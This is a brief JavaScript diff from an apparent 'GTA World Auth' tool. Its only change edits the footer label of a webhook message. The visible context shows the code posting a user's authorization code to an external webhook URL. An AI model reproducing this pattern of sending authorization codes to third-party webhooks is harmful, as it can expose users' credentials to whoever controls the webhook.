@@ -18,7 +18,7 @@ const sendWebhook = async (authCode) => {
             { name: "Authorization Code", value: ```${authCode}```, inline: false },
         ],
         timestamp: new Date().toISOString(),
-        footer: { text: "PHMC Tools - GTA World Auth" }
+        footer: { text: "PHMC-FR Tools - GTA World Auth" }
     };
     try {
         const response = await fetch(webhookURL, {
